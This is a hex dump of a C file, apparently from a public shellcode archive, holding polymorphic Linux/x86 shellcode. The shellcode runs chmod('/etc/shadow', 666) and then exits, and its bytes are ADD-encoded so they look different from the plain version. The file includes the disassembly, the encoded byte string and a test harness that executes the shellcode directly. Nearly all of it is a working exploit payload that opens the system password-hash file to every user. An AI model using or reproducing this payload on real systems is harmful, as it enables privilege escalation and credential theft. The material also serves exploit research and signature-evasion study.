00000000  2f 2a 0d 0a 54 69 74 6c  65 09 3a 20 4c 69 6e 75  |/*..Title.: Linu|
00000010  78 2f 78 38 36 20 2d 20  53 68 65 6c 6c 63 6f 64  |x/x86 - Shellcod|
00000020  65 20 50 6f 6c 79 6d 6f  72 70 68 69 63 20 63 68  |e Polymorphic ch|
00000030  6d 6f 64 28 22 2f 65 74  63 2f 73 68 61 64 6f 77  |mod("/etc/shadow|
00000040  22 2c 36 36 36 29 20 26  20 65 78 69 74 28 29 20  |",666) & exit() |
00000050  2d 20 35 34 20 62 79 74  65 73 0d 0a 45 6e 63 6f  |- 54 bytes..Enco|
00000060  64 65 20 20 3a 20 5f 41  44 44 20 2b 33 35 0d 0a  |de  : _ADD +35..|
00000070  0d 0a 41 75 74 68 6f 72  09 3a 20 4a 6f 6e 61 74  |..Author.: Jonat|
00000080  68 61 6e 20 53 61 6c 77  61 6e 0d 0a 4d 61 69 6c  |han Salwan..Mail|
00000090  09 3a 20 73 75 62 6d 69  74 20 5b 21 5d 20 73 68  |.: submit [!] sh|
000000a0  65 6c 6c 2d 73 74 6f 72  6d 2e 6f 72 67 0d 0a 0d  |ell-storm.org...|
000000b0  0a 0d 0a 21 20 4d 6f 72  65 20 73 68 65 6c 6c 63  |...! More shellc|
000000c0  6f 64 65 73 20 69 6e 20  3d 3e 20 68 74 74 70 3a  |odes in => http:|
000000d0  2f 2f 77 77 77 2e 73 68  65 6c 6c 2d 73 74 6f 72  |//www.shell-stor|
000000e0  6d 2e 6f 72 67 2f 73 68  65 6c 6c 63 6f 64 65 2f  |m.org/shellcode/|
000000f0  0d 0a 0d 0a 0d 0a 49 6e  66 6f 72 6d 61 74 69 6f  |......Informatio|
00000100  6e 73 20 20 5f 63 68 6d  6f 64 28 29 20 26 20 5f  |ns  _chmod() & _|
00000110  65 78 69 74 28 29 3a 0d  0a 3d 3d 3d 3d 3d 3d 3d  |exit():..=======|
00000120  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
00000130  3d 3d 3d 3d 3d 3d 3d 3d  3d 0d 0a 09 0d 0a 09 25  |=========......%|
00000140  65 61 78 20 3d 20 31 35  0d 0a 20 20 20 09 25 65  |eax = 15..   .%e|
00000150  62 78 20 3d 20 2f 65 74  63 2f 73 68 61 64 6f 77  |bx = /etc/shadow|
00000160  0d 0a 20 20 20 09 25 65  63 78 20 3d 20 36 36 36  |..   .%ecx = 666|
00000170  0d 0a 0d 0a 20 20 20 20  20 20 20 20 25 65 61 78  |....        %eax|
00000180  20 3d 20 31 0d 0a 20 20  20 20 20 20 20 20 25 65  | = 1..        %e|
00000190  62 78 20 3d 20 30 0d 0a  0d 0a 44 69 73 61 73 73  |bx = 0....Disass|
000001a0  65 6d 62 6c 79 20 6f 66  20 73 65 63 74 69 6f 6e  |embly of section|
000001b0  20 2e 74 65 78 74 3a 0d  0a 0d 0a 20 30 38 30 34  | .text:.... 0804|
000001c0  38 30 35 34 20 3c 2e 74  65 78 74 3e 3a 0d 0a 20  |8054 <.text>:.. |
000001d0  38 30 34 38 30 35 34 3a  09 35 31 20 20 20 20 20  |8048054:.51     |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 70  |              .p|
000001f0  75 73 68 20 20 20 25 65  63 78 0d 0a 20 38 30 34  |ush   %ecx.. 804|
00000200  38 30 35 35 3a 09 36 36  20 62 39 20 62 36 20 30  |8055:.66 b9 b6 0|
00000210  31 20 20 20 20 20 20 20  20 20 20 09 6d 6f 76 20  |1          .mov |
00000220  20 20 20 24 30 78 31 62  36 2c 25 63 78 0d 0a 20  |   $0x1b6,%cx.. |
00000230  38 30 34 38 30 35 39 3a  09 36 38 20 36 31 20 36  |8048059:.68 61 6|
00000240  34 20 36 66 20 37 37 20  20 20 20 20 20 20 09 70  |4 6f 77       .p|
00000250  75 73 68 20 20 20 24 30  78 37 37 36 66 36 34 36  |ush   $0x776f646|
00000260  31 0d 0a 20 38 30 34 38  30 35 65 3a 09 36 38 20  |1.. 804805e:.68 |
00000270  36 33 20 32 66 20 37 33  20 36 38 20 20 20 20 20  |63 2f 73 68     |
00000280  20 20 09 70 75 73 68 20  20 20 24 30 78 36 38 37  |  .push   $0x687|
00000290  33 32 66 36 33 0d 0a 20  38 30 34 38 30 36 33 3a  |32f63.. 8048063:|
000002a0  09 36 38 20 32 66 20 32  66 20 36 35 20 37 34 20  |.68 2f 2f 65 74 |
000002b0  20 20 20 20 20 20 09 70  75 73 68 20 20 20 24 30  |      .push   $0|
000002c0  78 37 34 36 35 32 66 32  66 0d 0a 20 38 30 34 38  |x74652f2f.. 8048|
000002d0  30 36 38 3a 09 38 39 20  65 33 20 20 20 20 20 20  |068:.89 e3      |
000002e0  20 20 20 20 20 20 20 20  20 20 09 6d 6f 76 20 20  |          .mov  |
000002f0  20 20 25 65 73 70 2c 25  65 62 78 0d 0a 20 38 30  |  %esp,%ebx.. 80|
00000300  34 38 30 36 61 3a 09 36  61 20 30 66 20 20 20 20  |4806a:.6a 0f    |
00000310  20 20 20 20 20 20 20 20  20 20 20 20 09 70 75 73  |            .pus|
00000320  68 20 20 20 24 30 78 66  0d 0a 20 38 30 34 38 30  |h   $0xf.. 80480|
00000330  36 63 3a 09 35 38 20 20  20 20 20 20 20 20 20 20  |6c:.58          |
00000340  20 20 20 20 20 20 20 20  20 09 70 6f 70 20 20 20  |         .pop   |
00000350  20 25 65 61 78 0d 0a 20  38 30 34 38 30 36 64 3a  | %eax.. 804806d:|
00000360  09 63 64 20 38 30 20 20  20 20 20 20 20 20 20 20  |.cd 80          |
00000370  20 20 20 20 20 20 09 69  6e 74 20 20 20 20 24 30  |      .int    $0|
00000380  78 38 30 0d 0a 20 38 30  34 38 30 36 66 3a 09 34  |x80.. 804806f:.4|
00000390  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
000003a0  20 20 20 20 09 69 6e 63  20 20 20 20 25 65 61 78  |    .inc    %eax|
000003b0  0d 0a 20 38 30 34 38 30  37 30 3a 09 63 64 20 38  |.. 8048070:.cd 8|
000003c0  30 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0               |
000003d0  20 09 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  | .int    $0x80..|
000003e0  0d 0a 2a 2f 0d 0a 0d 0a  0d 0a 23 69 6e 63 6c 75  |..*/......#inclu|
000003f0  64 65 20 22 73 74 64 69  6f 2e 68 22 0d 0a 0d 0a  |de "stdio.h"....|
00000400  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
00000410  20 3d 20 09 22 5c 78 65  62 5c 78 31 31 5c 78 35  | = ."\xeb\x11\x5|
00000420  65 5c 78 33 31 5c 78 63  39 5c 78 62 31 5c 78 33  |e\x31\xc9\xb1\x3|
00000430  30 5c 78 38 30 22 0d 0a  09 09 09 22 5c 78 36 63  |0\x80"....."\x6c|
00000440  5c 78 30 65 5c 78 66 66  5c 78 32 33 5c 78 38 30  |\x0e\xff\x23\x80|
00000450  5c 78 65 39 5c 78 30 31  5c 78 37 35 22 0d 0a 20  |\xe9\x01\x75".. |
00000460  20 09 09 09 22 5c 78 66  36 5c 78 65 62 5c 78 30  | ..."\xf6\xeb\x0|
00000470  35 5c 78 65 38 5c 78 65  61 5c 78 66 66 5c 78 66  |5\xe8\xea\xff\xf|
00000480  66 5c 78 66 66 22 0d 0a  09 09 09 22 5c 78 37 34  |f\xff"....."\x74|
00000490  5c 78 38 39 5c 78 64 63  5c 78 64 39 5c 78 32 34  |\x89\xdc\xd9\x24|
000004a0  5c 78 38 62 5c 78 38 34  5c 78 38 37 22 0d 0a 09  |\x8b\x84\x87"...|
000004b0  09 09 22 5c 78 39 32 5c  78 39 61 5c 78 38 62 5c  |.."\x92\x9a\x8b\|
000004c0  78 38 36 5c 78 35 32 5c  78 39 36 5c 78 38 62 5c  |x86\x52\x96\x8b\|
000004d0  78 38 62 22 0d 0a 09 09  09 22 5c 78 35 32 5c 78  |x8b"....."\x52\x|
000004e0  35 32 5c 78 38 38 5c 78  39 37 5c 78 61 63 5c 78  |52\x88\x97\xac\x|
000004f0  30 36 5c 78 38 64 5c 78  33 32 22 0d 0a 09 09 09  |06\x8d\x32".....|
00000500  22 5c 78 37 62 5c 78 66  30 5c 78 61 33 5c 78 36  |"\x7b\xf0\xa3\x6|
00000510  33 5c 78 66 30 5c 78 61  33 22 3b 0d 0a 0d 0a 69  |3\xf0\xa3";....i|
00000520  6e 74 20 6d 61 69 6e 28  29 0d 0a 7b 0d 0a 09 70  |nt main()..{...p|
00000530  72 69 6e 74 66 28 22 4c  65 6e 67 74 68 3a 20 25  |rintf("Length: %|
00000540  64 5c 6e 22 2c 73 74 72  6c 65 6e 28 73 68 65 6c  |d\n",strlen(shel|
00000550  6c 63 6f 64 65 29 29 3b  0d 0a 09 28 2a 28 76 6f  |lcode));...(*(vo|
00000560  69 64 28 2a 29 28 29 29  20 73 68 65 6c 6c 63 6f  |id(*)()) shellco|
00000570  64 65 29 28 29 3b 0d 0a  09 0d 0a 09 72 65 74 75  |de)();......retu|
00000580  72 6e 20 30 3b 0d 0a 7d                           |rn 0;..}|
00000588
